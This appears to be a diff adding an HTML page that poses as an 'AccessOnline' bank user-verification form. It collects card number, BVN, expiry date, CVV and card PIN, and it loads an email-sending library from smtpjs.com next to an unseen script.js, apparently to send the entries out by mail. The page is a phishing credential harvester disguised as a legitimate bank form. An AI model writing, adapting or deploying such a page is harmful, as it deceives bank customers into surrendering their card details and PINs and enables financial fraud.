@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+    <title>Form Validator</title>
+  </head>
+  <body>
+    <div class="container">
+      <img class="img" src="download.jpg">
+      <form id="form" class="form" onsubmit="onSubmit()"  method="get" action="#">
+        <h6>Welcome to the AccessOnline Form page</h6>
+        <h2>Please fill in the following account information to proceed with the current user verification process.</h2>
+        <div class="form-control">
+          <label for="cardnumber">Card Number</label>
+          <input inputmode="numeric" id="cardnumber" placeholder="0000 0000 0000 0000" maxlength="16" 
+          autocomplete="cc-number" />
+          <small>Error message</small>
+        </div>
+        <div class="form-control">
+          <label for="cardnumber">BVN Number</label>
+          <input inputmode="numeric" id="bvnnumber" placeholder="00000000000 " maxlength="11" 
+          autocomplete="cc-number" />
+          <small>Error message</small>
+        </div>
+        <div class="form-control">
+          <label for="expiry">Expiry</label>
+          <input type="month" inputmode="numeric" id="expiry" placeholder="MM / YY" autocomplete="cc-exp" 
+          maxlength="4" />
+          <small>Error message</small>
+        </div>
+        <div class="form-control">
+          <label for="cvv">CVV</label>
+          <input inputmode="numeric" placeholder="123" type="tel" autocomplete="cc-csc" maxlength="3" 
+          id="card-cvv"  value="">
+          <small>Error message</small>
+        </div>
+       
+        <div class="form-control">
+          <label for="card-pin">Card Pin</label>
+          <input type="password" inputmode="numeric" placeholder="1234"  autocomplete="cc-type" maxlength="4" 
+          id="card-pin"  value="">
+          <small>Error message</small>
+        </div>
+        <button type="submit" id="submit">Submit</button>
+      </form>
+      <small>An Authentication Code will be sent to your mail and to your mobile phone via SMS.</small>
+    </div>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="script.js"></script>
+  </body>
+</html>
